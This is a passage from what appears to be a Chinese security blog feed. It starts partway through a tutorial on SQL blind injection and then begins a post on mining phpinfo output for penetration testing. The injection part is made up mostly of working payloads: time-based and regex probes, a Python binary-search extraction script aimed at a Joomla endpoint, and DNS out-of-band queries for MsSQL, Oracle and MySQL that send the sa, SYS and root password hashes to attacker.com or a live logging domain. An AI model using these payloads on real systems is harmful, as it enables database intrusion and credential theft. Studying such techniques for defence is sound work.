title="1.举几个简单的例子："></a><strong>1.举几个简单的例子：</strong></h3><h4 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a><strong>示例1</strong></h4><p><strong>测试情况：</strong></p><pre><code class="hljs">1&#39;and if(length(database())=1,sleep(5),1) # 没有延迟1&#39;and if(length(database())=2,sleep(5),1) # 没有延迟1&#39;and if(length(database())=3,sleep(5),1) # 没有延迟1&#39;and if(length(database())=4,sleep(5),1) # 明显延迟</code></pre><p>**说明：**数据库名字长度为 4 </p><h4 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a><strong>示例2</strong></h4><p><strong>测试情况：</strong></p><pre><code class="hljs">1&#39;and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟…1&#39;and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟1&#39;and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟</code></pre><p>**说明:**数据库名的第一个字符为小写字母d</p><h4 id="示例3"><a href="#示例3" class="headerlink" title="示例3"></a><strong>示例3</strong></h4><p><strong>测试情况：</strong></p><pre><code class="hljs">index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP &#39;^[a-f]&#39; ANDID=1)Falseindex.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP &#39;^[0-9]&#39; ANDID=1)Trueindex.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP &#39;^[0-4]&#39; ANDID=1)Falseindex.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP &#39;^[5-9]&#39; ANDID=1)Trueindex.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP &#39;^[5-7]&#39; ANDID=1)Trueindex.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP &#39;^5&#39; ANDID=1)True</code></pre><p>**说明:**密码 hash 的第一个字符为5</p><p>更多函数例如 left 以及更详细的用法指南请见这篇文章的字符串部分  <a href="http://www.k0rz3n.com/2019/01/30/SQL%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E7%9A%84%E5%B0%8F%E6%80%BB%E7%BB%93/">传送门</a></p><h3 id="2-二分法提取数据"><a href="#2-二分法提取数据" class="headerlink" title="2.二分法提取数据"></a><strong>2.二分法提取数据</strong></h3><p>实际上我们上面的例子里面已经涉及到部分二分法的知识了，二分法对于我们猜解来讲是提高效率的非常好的方法，简单的说就是先和范围中间的值进行比较，然后判断数据是在中间值左边部分还是右边部分，然后继续相同的操作，直到正确猜中</p><p>想了一下是画图后来觉得不如直接上代码，下面是 C 语言实现二分法查找的一个例子 ：</p><pre><code class="hljs">int search(int arr[],int n,int key)&#123;　　 int low = 0,high = n-1; 　　int mid,count=0; 　　while(low&lt;=high)　　 &#123;  　　　　mid = (low+high)/2;  　　　　if(arr[mid] == key)   　　　　　　return mid;  　　　　if(arr[mid]&lt;key)  　　　　　　 low = mid + 1;  　　　　else  　　　　　　 high = mid - 1; 　　&#125; 　　return -1;&#125;</code></pre><p>下面是一个示例代码，来源于 <a href="https://www.freebuf.com/articles/web/175049.html">这篇文章</a>，其实我上面的那个 CTF 题的 EXP 也用的是二分法</p><pre><code class="hljs"># -*- coding:UTF-8 -*-import requestsimport sys# 准备工作url = &#39;http://localhost/Joomla/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=&#39;string = &#39;0123456789ABCDEFGHIGHLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;flag = &#39;&#39;cookies = &#123;&#39;9e44025326f96e2d9dc1a2aab2dbe5b1&#39; : &#39;l1p92lf44gi4s7jdf5q73l0bt5&#39;&#125;response = requests.get(&#39;http://localhost/Joomla/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (ascii(substr((select database()),1,1)) &gt; 78) THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)&#39;,cookies=cookies,timeout=2)print(response.text)i = 1while i &lt;= 7:    left = 0    right = len(string) - 1    mid = int((left + right) / 2)    print(&#39;\n&#39;)    print(flag)    print(&#39;Testing... &#39; + str(left) + &#39; &#39; + str(right))    # 特殊情况    if (right - left) == 1:        payload = &quot;(CASE WHEN (ascii(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;) THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)&quot;.format(i, str(ord(string[left])))        poc = url + payload        print(poc)        response = requests.get(poc,cookies=cookies,timout=2)        if (&#39;安全令牌无效&#39;) in response.text:            flag = flag + string[right]            print(flag)            exit()        else:             flag = flag + string[left]            print(flag)            exit()    # 二分法    while 1:        mid = int((left + right) / 2)        payload = &quot;(CASE WHEN (ascii(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;) THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)&quot;.format(i, str(ord(string[mid])))        poc = url + payload        print(poc)        response = requests.get(poc,cookies=cookies,timeout=2)        # 右半部        if (&#39;安全令牌无效&#39;) in response.text:            left = mid + 1            print(&#39;left:&#39;+str(left))        # 左半部        else:             right = mid            print(&#39;right:&#39;+str(right))        if (left == right):            flag = flag + string[left]            break        # 特殊情况        if (right - left) == 1:            payload = &quot;(CASE WHEN (ascii(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;) THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)&quot;.format(i, str(ord(string[left])))            poc = url + payload            print(poc)            response = requests.get(poc,cookies=cookies,timeout=2)            if (&#39;安全令牌无效&#39;) in response.text:                flag = flag + string[right]                print(flag)                break            else:                 flag = flag + string[left]                print(flag)                break    i += 1print(flag)</code></pre><h2 id="0X05-高级技巧"><a href="#0X05-高级技巧" class="headerlink" title="0X05 高级技巧"></a><strong>0X05 高级技巧</strong></h2><p>这里要讲的高级技巧就是著名的 Blind OOB(out of bind),在盲注中使用 dns 进行外带的技巧，当然这个方法是有限制条件的，</p><blockquote><p><strong>要求 :</strong><br>除了Oracle 支持 windows 和 Linux 系统的攻击以外其他攻击只能在Windows环境下（UNC路径） </p></blockquote><h3 id="1-简单介绍："><a href="#1-简单介绍：" class="headerlink" title="1.简单介绍："></a><strong>1.简单介绍：</strong></h3><p>服务器可以将 DNS 查询从安全系统转发到互联网中任意 DNS 服务器，这种行为构成了不受控制的数据传输通道的基础。即使我们假设不允许服务器与公共网络连接，如果目标主机能够解析任意域名，也可以通过转发的 DNS 查询进行数据外带。在 sql 盲注中我们通常以逐位方式检索数据，这是非常繁琐且耗时的过程。因此，攻击者通常需要数万个请求来检索常规大小的表的内容。</p><p>而这种 DNS 外带的方式，可以使得攻击者通过从易受攻击的数据库管理系统（DBMS）发出特制的DNS请求，攻击者可以在另一端拦截来查看恶意SQL查询（例如管理员密码）的结果，在这种情况下每次能传输数十个字符。</p><p>此类攻击最有可能发生在任何接受网络地址的功能上，下面是整个攻击过程的示意图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A821.png" alt="此处输入图片的描述"></p><h3 id="2-针对-MsSQL"><a href="#2-针对-MsSQL" class="headerlink" title="2.针对 MsSQL"></a><strong>2.针对 MsSQL</strong></h3><p>扩展存储过程是直接在Microsoft SQL Server（MsSQL）的地址空间中运行的动态链接库。攻击者可以使用部分存储过程配合符合 Windows  Universal Naming Convention（通用命名规则UNC）的文件和路径格式来触发 DNS 解析</p><p><strong>格式如下：</strong></p><pre><code class="hljs">\\ComputerName\SharedFolder\Resource</code></pre><p>通过将 ComputerName 设置为自定义的地址的值，攻击者能够完成攻击，下面是可以利用的扩展。存储过程。</p><h4 id="1-master-xp-dirtree"><a href="#1-master-xp-dirtree" class="headerlink" title="1.master..xp_dirtree"></a><strong>1.master..xp_dirtree</strong></h4><p>这个扩展存储过程用来获取指定的目录列表和其所有子目录，使用方式如下：</p><pre><code class="hljs">master..xp_dirtree &#39;&lt;dirpath&gt;&#39;</code></pre><p>比如想要获取 C:\Windows 目录下的所有目录及其子目录</p><pre><code class="hljs">EXEC master..xp_dirtree &#39;C:\Windows&#39;;</code></pre><h4 id="2-master-xp-fileexist"><a href="#2-master-xp-fileexist" class="headerlink" title="2.master..xp_fileexist"></a><strong>2.master..xp_fileexist</strong></h4><p>这个扩展存储过程能判断某一文件是否在磁盘上，使用方式如下：</p><pre><code class="hljs">xp_fileexist &#39;&lt;filepath&gt;&#39;</code></pre><p>例如想要检查 boot.ini 这个文件是否在 C盘 </p><pre><code class="hljs">EXEC master..xp_fileexist &#39;C:\boot.ini&#39;;</code></pre><h4 id="3-master-xp-subdirs"><a href="#3-master-xp-subdirs" class="headerlink" title="3.master..xp_subdirs"></a><strong>3.master..xp_subdirs</strong></h4><p>这个扩展存储过程可以给出指定的目录下的所有目录列表，使用方式如下：</p><pre><code class="hljs">master..xp_subdirs &#39;&lt;dirpath&gt;&#39;</code></pre><p>例如：列出 C:\Windows 下的所有第一层子目录</p><pre><code class="hljs">EXEC master..xp_subdirs &#39;C:\Windows&#39;;</code></pre><h4 id="4-实战案例"><a href="#4-实战案例" class="headerlink" title="4.实战案例"></a><strong>4.实战案例</strong></h4><p>下面的例子讲述的是如何通过 master..xp_dirtree() 这个扩展存储过程将 sa 的密码的 哈希值通过 DNS 请求外带</p><pre><code class="hljs">DECLARE @host varchar(1024);SELECT @host=(SELECT TOP 1master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_logins WHERE name=&#39;sa&#39;)+&#39;.attacker.com&#39;;EXEC(&#39;master..xp_dirtree &quot;\\&#39;+@host+&#39;\foobar$&quot;&#39;);</code></pre><p>使用此预先计算形式是因为扩展存储过程不接受子查询作为给定参数值。 因此使用临时变量来存储SQL查询的结果。</p><h3 id="3-针对-Oracle"><a href="#3-针对-Oracle" class="headerlink" title="3.针对 Oracle"></a><strong>3.针对 Oracle</strong></h3><p>Oracle提供了一套PL &#x2F; SQL软件包及其Oracle数据库服务器来扩展数据库功能。 其中几个特别适用于网络访问，从而能很好地在攻击中加以利用。</p><h4 id="1-UTL-INADDR-GET-HOST-ADDRESS"><a href="#1-UTL-INADDR-GET-HOST-ADDRESS" class="headerlink" title="1.UTL_INADDR.GET_HOST_ADDRESS"></a><strong>1.UTL_INADDR.GET_HOST_ADDRESS</strong></h4><p>包UTL_INADDR提供了Internet寻址支持 - 例如检索本地和远程主机的主机名和IP地址。 其中成员函数 GET_HOST_ADDRESS（）<br>检索指定主机的IP地址，使用方法：</p><pre><code class="hljs">UTL_INADDR.GET_HOST_ADDRESS（&#39;&lt;host&gt;&#39;）</code></pre><p>例如，要获取主机test.example.com的IP地址，</p><pre><code class="hljs">SELECT UTL_INADDR.GET_HOST_ADDRESS（&#39;test.example.com&#39;）;</code></pre><h4 id="2-UTL-HTTP-REQUEST"><a href="#2-UTL-HTTP-REQUEST" class="headerlink" title="2.UTL_HTTP.REQUEST"></a><strong>2.UTL_HTTP.REQUEST</strong></h4><p>包UTL_HTTP从SQL和PL &#x2F; SQL发出HTTP调用。 它的方法 REQUEST（）可以返回从给定地址获取的前2000个字节的数据，使用方法：</p><pre><code class="hljs">UTL_HTTP.REQUEST(&#39;&lt;url&gt;&#39;)</code></pre><p>例如，想获取 <a href="http://test.example.com/index.php%E5%BC%80%E5%A4%B4%E7%9A%84">http://test.example.com/index.php开头的</a> 2000 字节数据</p><pre><code class="hljs">SELECT UTL_HTTP.REQUEST(&#39;http://test.example.com/index.php&#39;) FROM DUAL;</code></pre><h4 id="3-HTTPURITYPE-GETCLOB"><a href="#3-HTTPURITYPE-GETCLOB" class="headerlink" title="3.HTTPURITYPE.GETCLOB"></a><strong>3.HTTPURITYPE.GETCLOB</strong></h4><p>类HTTPURITYPE的实例方法GETCLOB（）返回从给定地址检索的 <a href="https://baike.baidu.com/item/CLOB/6327280">Character Large Object（CLOB）</a>，使用方法：</p><pre><code class="hljs">HTTPURITYPE(&#39;&lt;url&gt;&#39;).GETCLOB()</code></pre><p>例如，要从位于<a href="http://test.example.com/index.php%E7%9A%84%E9%A1%B5%E9%9D%A2%E5%90%AF%E5%8A%A8%E5%86%85%E5%AE%B9%E6%A3%80%E7%B4%A2%EF%BC%8C%E8%AF%B7%E8%BF%90%E8%A1%8C%EF%BC%9A">http://test.example.com/index.php的页面启动内容检索，请运行：</a></p><pre><code class="hljs">SELECT HTTPURITYPE(&#39;http://test.example.com/index.php&#39;).GETCLOB() FROM DUAL;</code></pre><h4 id="4-DBMS-LDAP-INIT"><a href="#4-DBMS-LDAP-INIT" class="headerlink" title="4.DBMS_LDAP.INIT"></a><strong>4.DBMS_LDAP.INIT</strong></h4><p>包 DBMS_LDAP 使 PL&#x2F;SQL程序员能够从轻量级目录访问协议（LDAP）服务器访问数据。 它的INIT（）过程用于初始化LDAP服务器的会话，</p><pre><code class="hljs">DBMS_LDAP.INIT((&#39;&lt;host&gt;&#39;,&lt;port&gt;)</code></pre><p>例如 与 主机 test.example.com 初始化一个链接</p><pre><code class="hljs">SELECT</code></pre><p>DBMS_LDAP.INIT((‘test.example.com’,80) FROM<br>DUAL;</p><blockquote><p><strong>注意：</strong></p><p>攻击者可以使用任何提到的Oracle子例程来激发DNS请求。 但是，从Oracle11g开始，可能导致网络访问的子例程受到限制，但DBMS_LDAP.INIT() 除外</p></blockquote><h4 id="5-实战案例"><a href="#5-实战案例" class="headerlink" title="5.实战案例"></a><strong>5.实战案例</strong></h4><p>以下是使用 Oracle程序DBMS_LDAP.INIT()通过DNS解析机制推送系统管理员（SYS）密码哈希的示例</p><pre><code class="hljs">SELECT DBMS_LDAP.INIT((SELECT password</code></pre><p>FROM SYS.USER$ WHERE<br>name&#x3D;’SYS’)||’.attacker.com’,80) FROM DUAL;</p><h3 id="4-针对-MySQL"><a href="#4-针对-MySQL" class="headerlink" title="4.针对 MySQL"></a><strong>4.针对 MySQL</strong></h3><p>mysql 相对于前面两个数据库系统来讲就显得方法单一，只提供了一个可以利用的方法，不过还是需要条件的</p><h4 id="1-利用条件"><a href="#1-利用条件" class="headerlink" title="1.利用条件"></a><strong>1.利用条件</strong></h4><p>在MySQL中，存在一个称为 “secure_file_priv” 的全局系统变量。此变量用于限制数据导入和导出,例如由LOAD DATA和SELECT … INTO OUTFILE语句和LOAD_FILE（）函数执行的操作。</p><p>(1)如果将其设置为目录名称，则服务器会将导入和导出操作限制为仅适用于该目录中的文件。而且该目录必须存在，服务器不会自动创建它。<br>(2)如果变量为空(没有设置)，则可以随意导入导出(不安全)<br>(3)如果设置为NULL，则服务器禁用所有导入和导出操作。<strong>从MySQL 5.5.53开始，该值为默认值</strong></p><p>另外 ‘secure_file_priv’ 是一个全局变量，且是一个只读变量，这意味着你不能在运行时更改它。</p><p>我们可以使用下面的语句查询</p><pre><code class="hljs">select @@secure_file_priv;select @@global.secure_file_priv;show variables like &quot;secure_file_priv&quot;; mysql&gt; select @@secure_file_priv;+--------------------+| @@secure_file_priv |+--------------------+|                    |+--------------------+1 row in set (0.00 sec)</code></pre><p>此时我的 mysql 这个选项没有设置，所以可以使用这个方法</p><h4 id="1-LOAD-FILE"><a href="#1-LOAD-FILE" class="headerlink" title="1.LOAD_FILE"></a><strong>1.LOAD_FILE</strong></h4><p>mysql 的 LOAD_FILE() 能读取文件内容然后返回对应的字符串，使用方法</p><pre><code class="hljs">LOAD_FILE(&#39;&lt;filepath&gt;&#39;)</code></pre><p>例如想获取 C:\Windows\system.ini 的内容</p><pre><code class="hljs">SELECT LOAD_FILE(&#39;C:\\Windows\\system.ini&#39;);</code></pre><h4 id="2-实战案例"><a href="#2-实战案例" class="headerlink" title="2.实战案例"></a><strong>2.实战案例</strong></h4><p>以下是使用MySQL函数LOAD_FILE（）通过DNS解析机制推送系统管理员（root）密码哈希的示例：</p><pre><code class="hljs">SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT password FROM mysql.user WHERE user=&#39;root&#39; LIMIT 1),&#39;.attacker.com\\foobar&#39;));</code></pre><p>我本地也做了对应的测试</p><pre><code class="hljs">select load_file(concat(&#39;\\\\&#39;,@@version,&#39;.9a56627dc016fc8b5c6e.d.zhack.ca\\a.txt&#39;));</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A822.png" alt="此处输入图片的描述"></p><p>当然我们可以对这个 payload 进行必要的编码</p><pre><code class="hljs">select load_file(concat(0x5c5c5c5c,@@version,0x2E62383862306437653533326238663635333164322E642E7A6861636B2E63615C5C612E747874));</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A823.png" alt="此处输入图片的描述"></p><blockquote><p><strong>注意:</strong> mysql 编码的时候每个反斜线都要加一个反斜线来转义</p></blockquote><p>这种方式可以用于 union 和 error-base 的 sqli 中，如下</p><pre><code class="hljs">http://192.168.0.100/?id=-1&#39;+union+select+1,load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874)),3-- -http://192.168.0.100/?id=-1&#39; or !(select*from(select   load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874)))x)-~0-- -http://192.168.0.100/?id=-1&#39; or exp(~(select*from(select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874)))a))-- -</code></pre><p>当然除了or 你还可以用以下 ||, |, and, &amp;&amp;, &amp;, &gt;&gt;, &lt;&lt;, ^, xor, &lt;&#x3D;, &lt;, ,&gt;, &gt;&#x3D;, *, mul, &#x2F;, div, -, +, %, mod.</p><h3 id="5-sqlmap-的扩展"><a href="#5-sqlmap-的扩展" class="headerlink" title="5.sqlmap 的扩展"></a><strong>5.sqlmap 的扩展</strong></h3><p>由于这种在攻击中方便快捷的特性，sqlmap 也进行了响应的扩展来支持这种攻击方式，添加了新的命令行参数 –dns-domain</p><p>使用时指定对应的服务器     </p><pre><code class="hljs">--dns-domain=attacker.com</code></pre><p>但是因为 sqlmap 在运行过程中遵循的是 union 和 error-base 优先级最高的原则，所以只有当攻击是基于 blind 并且用户使用了上面的选项时 dns 攻击才会开始</p><p>另外每个得到的DNS解析请求都被编码为十六进制格式，因为这是DNS域名的（事实上的）标准,这样就可以保留所有最终的非单词字符。此外，较长的SQL查询结果的十六进制表示被分成几部分,这样做是因为完整域名内的每个节点的标签（例如.example.）的长度限制为63个字符。</p><h2 id="0X06-总结"><a href="#0X06-总结" class="headerlink" title="0X06 总结"></a><strong>0X06 总结</strong></h2><p>由于 SQLi 的涉及内容太多，我想来想去觉得一篇文章肯定不能全部涵盖，于是这篇文章主要讲的是一些我在宏观上对 SQLi 盲注的理解，其他的关于 SQLi Bypass 的内容准备再开一个坑，由于篇幅原因，和时间仓促，文中有些内容难免出现不完善或者错误的情况，请师傅们不吝赐教。</p><h2 id="0X07-参考链接"><a href="#0X07-参考链接" class="headerlink" title="0X07 参考链接"></a><strong>0X07 参考链接</strong></h2><p><a href="http://www.sqlinjection.net/heavy-query/">http://www.sqlinjection.net/heavy-query/</a><br><a href="https://skysec.top/2018/04/04/pwnhub-time-injection%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%96%B0%E6%80%9D%E8%B7%AF/">https://skysec.top/2018/04/04/pwnhub-time-injection%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%96%B0%E6%80%9D%E8%B7%AF/</a><br><a href="http://php.net/manual/zh/features.persistent-connections.php">http://php.net/manual/zh/features.persistent-connections.php</a><br><a href="https://www.freebuf.com/articles/web/30841.html">https://www.freebuf.com/articles/web/30841.html</a><br><a href="https://www.cnblogs.com/xdans/p/5412468.html">https://www.cnblogs.com/xdans/p/5412468.html</a><br><a href="https://www.exploit-db.com/papers/17073">https://www.exploit-db.com/papers/17073</a><br><a href="https://www.freebuf.com/articles/web/175049.html">https://www.freebuf.com/articles/web/175049.html</a><br><a href="https://www.jianshu.com/p/95c814c515a2">https://www.jianshu.com/p/95c814c515a2</a><br><a href="https://www.cnblogs.com/ichunqiu/archive/2018/07/24/9360317.html">https://www.cnblogs.com/ichunqiu/archive/2018/07/24/9360317.html</a><br><a href="https://www.exploit-db.com/exploits/42033">https://www.exploit-db.com/exploits/42033</a><br><a href="https://www.freebuf.com/vuls/138838.html">https://www.freebuf.com/vuls/138838.html</a><br><a href="https://osandamalith.com/2017/03/13/mysql-blind-injection-in-insert-and-update-statements/">https://osandamalith.com/2017/03/13/mysql-blind-injection-in-insert-and-update-statements/</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞研究</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL 注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPINFO 中的重要信息</title>
    <link href="/2019/02/12/PHPINFO%20%E4%B8%AD%E7%9A%84%E9%87%8D%E8%A6%81%E4%BF%A1%E6%81%AF/"/>
    <url>/2019/02/12/PHPINFO%20%E4%B8%AD%E7%9A%84%E9%87%8D%E8%A6%81%E4%BF%A1%E6%81%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>思考一下获得了 PHPINFO 以后我们需要观察哪些比较重要的信息来帮助我们进一步渗透</p><h2 id="0X01-PHPINFO-中的敏感信息"><a href="#0X01-PHPINFO-中的敏感信息" class="headerlink" title="0X01 PHPINFO 中的敏感信息"></a><strong>0X01 PHPINFO 中的敏感信息</strong></h2><h3 id="1-PHP-版本信息"><a href="#1-PHP-版本信息" class="headerlink" title="1.PHP 版本信息"></a><strong>1.PHP 版本信息</strong></h3><p>我们知道 PHP 不同版本之间在很多方面都有着差异，当然我么重点关注的肯定是一些函数参数以及一些安全性机制的差异。特别是 PHP5 和 PHP7 之间的差异尤其的大，因此知道了 PHP 的确切版本是我们需要做的第一步。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHPINFO1.png" alt="此处输入图片的描述"></p><span id="more"></span><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHPINFO2.png" alt="此处输入图片的描述"></p><h3 id="2-系统的版本信息"><a href="#2-系统的版本信息" class="headerlink" title="2.系统的版本信息"></a><strong>2.系统的版本信息</strong></h3><p>系统无非是两种 Linux 和 Windows ，这在我们后期命令执行的时候或者是 bypass disable_function 的时候有用</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHPINFO3.png" alt="此处输入图片的描述"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHPINFO4.png" alt="此处输入图片的描述"></p><h3 id="3-Configure-Command-编译命令"><a href="#3-Configure-Command-编译命令" class="headerlink" title="3.Configure Command(编译命令)"></a><strong>3.Configure Command(编译命令)</strong></h3><p>这个其实就是编译 php 的时候的命令,这里面其实包含了几乎所有的， php 要加载的扩展和功能，但是看起来不是很方便(因为比较乱),但也是一目了然，当然这些功能在后面都有专门的栏目介绍。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHPINFO5.png" alt="此处输入图片的描述"></p><h3 id="4-Loaded-Configuration-File-配置文件位置"><a href="#4-Loaded-Configuration-File-配置文件位置" class="headerlink" title="4.Loaded Configuration File(配置文件位置)"></a><strong>4.Loaded Configuration File(配置文件位置)</strong></h3><p>这一栏表明了 php.ini 这个 php 配置文件的位置，在有文件读取的情况下可以进行读取，在渗透中还是很有帮助的。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHPINFO6.png" alt="此处输入图片的描述"></p><h3 id="5-Registered-PHP-Streams-支持的流"><a href="#5-Registered-PHP-Streams-支持的流" class="headerlink" title="5.Registered PHP Streams(支持的流)"></a><strong>5.Registered PHP Streams(支持的流)</strong></h3><p>这个在文件包含、反序列化还有一些关键的 bypass 的时候非常有用</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHPINFO7.png" alt="此处输入图片的描述"></p><h3 id="6-Registered-Stream-Filters-支持的流过滤器"><a href="#6-Registered-Stream-Filters-支持的流过滤器" class="headerlink" title="6.Registered Stream Filters(支持的流过滤器)"></a><strong>6.Registered Stream Filters(支持的流过滤器)</strong></h3><p>这个同样在文件包含、反序列化还有一些关键的 bypass 的时候非常有用</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHPINFO8.png" alt="此处输入图片的描述"></p><h3 id="7-Core-核心"><a href="#7-Core-核心" class="headerlink" title="7.Core(核心)"></a><strong>7.Core(核心)</strong></h3><p>这个栏目里面有非常多重要的配置信息，我们可以简单的看一下：</p><h4 id="1-allow-url-fopen-allow-url-include"><a href="#1-allow-url-fopen-allow-url-include" class="headerlink" title="(1)allow_url_fopen&amp;allow_url_include"></a><strong>(1)allow_url_fopen&amp;allow_url_include</strong></h4><p>文件包含必看选项之一</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHPINFO9.png" alt="此处输入图片的描述"></p><h4 id="2-disable-functions"><a href="#2-disable-functions" class="headerlink" title="(2)disable_functions"></a><strong>(2)disable_functions</strong></h4><p>命令执行、代码执行必看选项之一，具体可以看我的<a href="https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/">这篇文章</a></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHPINFO10.png" alt="此处输入图片的描述"></p><h4 id="3-错误提示"><a href="#3-错误提示" class="headerlink" title="(3)错误提示"></a><strong>(3)错误提示</strong></h4><p>调试过程中经常使用的错误提示在没有关闭的情况下放入生产环境是不堪设想的</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHPINFO11.png" alt="此处输入图片的描述"></p><h4 id="4-enable-dl"><a href="#4-enable-dl" class="headerlink" title="(4)enable_dl"></a><strong>(4)enable_dl</strong></h4><p>该选项<strong>默认为 on(在未来将被移除)</strong> ，我们看一下 官方手册怎么说的</p><blockquote><p>该指令仅对 Apache 模块版本的 PHP 有效。 你可以针对每个虚拟机或每个目录开启或关闭 dl() 动态加载 PHP 模块。</p><p>关闭动态加载的主要原因是为了安全。通过动态加载，有可能忽略所有 open_basedir 限制。 默认允许动态加载，除了使用 安全模式。在安全模式，总是无法使用 dl()。</p></blockquote><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHPINFO14.png" alt="此处输入图片的描述"></p><h4 id="5-extension-dir"><a href="#5-extension-dir" class="headerlink" title="(5)extension_dir"></a><strong>(5)extension_dir</strong></h4><p>和 dl() 配合使用效果更好，具体可以看<a href="https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/">这篇文章</a></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHPINFO13.png" alt="此处输入图片的描述"></p><h4 id="6-include-path"><a href="#6-include-path" class="headerlink" title="(6)include_path"></a><strong>(6)include_path</strong></h4><p>PHP 用include()函数包函文件时的默认路径</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHPINFO12.png" alt="此处输入图片的描述"></p><h4 id="7-open-basedir"><a href="#7-open-basedir" class="headerlink" title="(7)open_basedir"></a><strong>(7)open_basedir</strong></h4><p>这个选项设置了文件读取的时候的目录限制</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHPINFO15.png" alt="此处输入图片的描述"></p><h4 id="8-short-open-tag"><a href="#8-short-open-tag" class="headerlink" title="(8)short_open_tag"></a><strong>(8)short_open_tag</strong></h4><p>判断服务器是不是支持短标签，这在写 shell 的时候很有帮助</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHPINFO19.png" alt="此处输入图片的描述"></p><h3 id="8-phar"><a href="#8-phar" class="headerlink" title="8.phar"></a><strong>8.phar</strong></h3><p>文件包含还有反序列化重点关注</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHPINFO16.png" alt="此处输入图片的描述"></p><h3 id="9-SESSION"><a href="#9-SESSION" class="headerlink" title="9.SESSION"></a><strong>9.SESSION</strong></h3><p>session.save_path&#x3D;””   –设置session的存储路径<br>session.save_handler&#x3D;”” –设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)<br>session.auto_start   boolen –指定会话模块是否在请求开始时启动一个会话,默认为0不启动<br>session.serialize_handler   string –定义用来序列化&#x2F;反序列化的处理器名字。默认使用php</p><p><strong>例如：</strong></p><pre><code class="hljs">session.save_path=&quot;D:\xampp\tmp&quot;表明所有的session文件都是存储在xampp/tmp下session.save_handler=files    表明session是以文件的方式来进行存储的session.auto_start=0表明默认不启动sessionsession.serialize_handler=php    表明session的默认序列话引擎使用的是php序列话引擎</code></pre><p>这几个选项在文件包含的时候以及反序列化的时候非常的有用，具体可以参考一下 <a href="https://www.k0rz3n.com/2018/11/21/LCTF%202018%20%E9%83%A8%E5%88%86%20web%20%E9%A2%98%20writeup/5.png">LCTF2018 的一道题</a> 以及我之前的<a href="https://www.k0rz3n.com/2018/11/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8B%20PHP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">这篇文章</a> </p><h3 id="10-PHP-Variables"><a href="#10-PHP-Variables" class="headerlink" title="10.PHP Variables"></a><strong>10.PHP 